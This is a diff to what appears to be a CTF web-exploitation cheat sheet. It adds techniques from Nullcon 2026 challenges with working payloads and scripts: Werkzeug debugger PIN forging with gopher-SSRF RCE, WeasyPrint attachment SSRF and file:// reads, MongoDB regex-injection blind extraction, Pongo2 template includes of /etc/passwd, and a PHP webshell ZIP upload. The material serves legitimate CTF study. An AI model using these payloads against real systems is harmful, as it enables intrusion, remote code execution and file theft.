@@ -335,7 +335,8 @@ def make_djvu_exploit(command):
     if len(ant_data) % 2: djvu_body += b'\x00'
 
     # FORM header
-    djvu = b'AT&TFORM' + struct.pack('>I', len(djvu_body)) + djvu_body
+    # AT&T = optional 4-byte prefix; FORM = IFF chunk type (separate fields)
+    djvu = b'AT&T' + b'FORM' + struct.pack('>I', len(djvu_body)) + djvu_body
     return djvu
 
 exploit = make_djvu_exploit("system('cat /flag.txt')")
@@ -416,10 +417,31 @@ zip -y exploit.zip file.txt
 3. **SSRF via pycurl:** If `/fetch` endpoint uses pycurl, target `http://127.0.0.1/admin/flag`
 4. **Header bypass:** Some endpoints check `X-Fetcher` or similar custom headers — include in SSRF request
 
-**Werkzeug debugger RCE:** If `/console` is accessible, generate PIN:
-- Read `/proc/self/environ`, `/sys/class/net/eth0/address`, `/proc/sys/kernel/random/boot_id`
-- Compute PIN using Werkzeug's algorithm
-- Execute arbitrary Python in debugger console
+**Werkzeug debugger RCE:** If `/console` is accessible:
+1. **Read system identifiers via SSRF:** `/etc/machine-id`, `/sys/class/net/eth0/address`
+2. **Get console SECRET:** Fetch `/console` page, extract `SECRET = "..."` from HTML
+3. **Compute PIN cookie:**
+   ```python
+   import hashlib
+   h = hashlib.sha1()
+   for bit in (username, "flask.app", "Flask", modfile, str(node), machine_id):
+       h.update(bit.encode() if isinstance(bit, str) else bit)
+   h.update(b"cookiesalt")
+   cookie_name = "__wzd" + h.hexdigest()[:20]
+   h.update(b"pinsalt")
+   num = f"{int(h.hexdigest(), 16):09d}"[:9]
+   pin = "-".join([num[:3], num[3:6], num[6:]])
+   pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
+   ```
+4. **Execute via gopher SSRF:** If direct access is blocked, use gopher to send HTTP request with PIN cookie:
+   ```python
+   cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
+   req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
+   gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
+   # SSRF to gopher_url
+   ```
+
+**Key insight:** Even when Werkzeug console is only reachable from localhost, the combination of SSRF + gopher protocol allows full PIN bypass and RCE. The PIN trust cookie authenticates the session without needing the actual PIN entry.
 
 ---
 
@@ -463,3 +485,132 @@ curl 'https://target/public%2f../nginx.conf'
 # Filesystem resolves to /public/../nginx.conf → /nginx.conf
 ```
 **Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.
+
+---
+
+## WeasyPrint SSRF & File Read (CVE-2024-28184, Nullcon 2026)
+
+**Pattern (Web 2 Doc 1/2):** App converts user-supplied URL to PDF using WeasyPrint. Attachment fetches bypass internal header checks and can read local files.
+
+### Variant 1: Blind SSRF via Attachment Oracle
+WeasyPrint `<a rel="attachment" href="...">` fetches the URL in a separate codepath without `X-Fetcher` or similar internal headers. If the target is localhost-only, the attachment fetch succeeds from localhost.
+
+**Boolean oracle:** Embedded file appears in PDF only when target returns HTTP 200:
+```python
+# Check for embedded attachment in PDF
+def has_attachment(pdf_bytes):
+    return b"/Type /EmbeddedFile" in pdf_bytes
+
+# Blind extraction via charCodeAt oracle
+for i in range(flag_len):
+    for ch in charset:
+        html = f'<a rel="attachment" href="http://127.0.0.1:5000/admin/flag?i={i}&c={ch}">A</a>'
+        pdf = convert_url_to_pdf(host_html(html))
+        if has_attachment(pdf):
+            flag += ch; break
+```
+
+### Variant 2: Local File Read via file:// Attachment
+```html
+<!-- Host this HTML, submit URL to converter -->
+<link rel="attachment" href="file:///flag.txt">
+```
+**Extract:** `pdfdetach -save 1 -o flag.txt output.pdf`
+
+**Key insight:** WeasyPrint processes `<link rel="attachment">` and `<a rel="attachment">` -- both can reference `file://` or internal URLs. The attachment is embedded in the PDF as a file stream.
+
+---
+
+## MongoDB Regex Injection / $where Blind Oracle (Nullcon 2026)
+
+**Pattern (CVE DB):** Search input interpolated into `/.../i` regex in MongoDB query. Break out of regex to inject arbitrary JS conditions.
+
+**Injection payload:**
+```
+a^/)||(<JS_CONDITION>)&&(/a^
+```
+This breaks the regex context and injects a boolean condition. Result count reveals truth value.
+
+**Binary search extraction:**
+```python
+def oracle(condition):
+    # Inject into regex context
+    payload = f"a^/)||(({condition}))&&(/a^"
+    html = post_search(payload)
+    return parse_result_count(html) > 0
+
+# Find flag length
+lo, hi = 1, 256
+while lo < hi:
+    mid = (lo + hi + 1) // 2
+    if oracle(f"this.product.length>{mid}"): lo = mid
+    else: hi = mid - 1
+length = lo + 1
+
+# Extract each character
+for i in range(length):
+    l, h = 31, 126
+    while l < h:
+        m = (l + h + 1) // 2
+        if oracle(f"this.product.charCodeAt({i})>{m}"): l = m
+        else: h = m - 1
+    flag += chr(l + 1)
+```
+
+**Detection:** Unsanitized input in MongoDB `$regex` or `$where`. Test with `a/)||true&&(/a` vs `a/)||false&&(/a` -- different result counts confirm injection.
+
+---
+
+## Pongo2 / Go Template Injection via Path Traversal (Nullcon 2026)
+
+**Pattern (WordPress Static Site Generator):** Go app renders templates with Pongo2. Template parameter has path traversal allowing rendering of uploaded files.
+
+**Attack chain:**
+1. Upload file containing: `{% include "/flag.txt" %}`
+2. Get upload ID from session cookie (base64 decode, extract hex ID)
+3. Request render with traversal: `/generate?template=../uploads/<id>/pwn`
+
+**Pongo2 SSTI payloads:**
+```
+{% include "/etc/passwd" %}
+{% include "/flag.txt" %}
+{{ "test" | upper }}
+```
+
+**Detection:** Go web app with template rendering + file upload. Check for `pongo2`, `jet`, or standard `html/template` in source.
+
+---
+
+## ZIP Upload with PHP Webshell (Nullcon 2026)
+
+**Pattern (virus_analyzer):** App accepts ZIP uploads, extracts to web-accessible directory, serves extracted files.
+
+**Exploit:**
+```bash
+# Create PHP webshell
+echo '<?php echo file_get_contents("/flag.txt"); ?>' > shell.php
+zip payload.zip shell.php
+curl -F 'zipfile=@payload.zip' http://target/
+# Access: http://target/uploads/<id>/shell.php
+```
+
+**Variants:**
+- If `system()` blocked ("Cannot fork"), use `file_get_contents()` or `readfile()`
+- If `.php` blocked, try `.phtml`, `.php5`, `.phar`, or upload `.htaccess` first
+- Race condition: file may be deleted after extraction -- access immediately
+
+---
+
+## basename() Bypass for Hidden Files (Nullcon 2026)
+
+**Pattern (Flowt Theory 2):** App uses `basename()` to prevent path traversal in file viewer, but it only strips directory components. Hidden/dot files in the same directory are still accessible.
+
+**Exploit:**
+```bash
+# basename() allows .lock, .htaccess, etc.
+curl "http://target/?view_receipt=.lock"
+# .lock reveals secret filename
+curl "http://target/?view_receipt=secret_XXXXXXXX"
+```
+
+**Key insight:** `basename()` is NOT a security function -- it only extracts the filename component. It doesn't filter hidden files (`.foo`), backup files (`file~`), or any filename without directory separators.
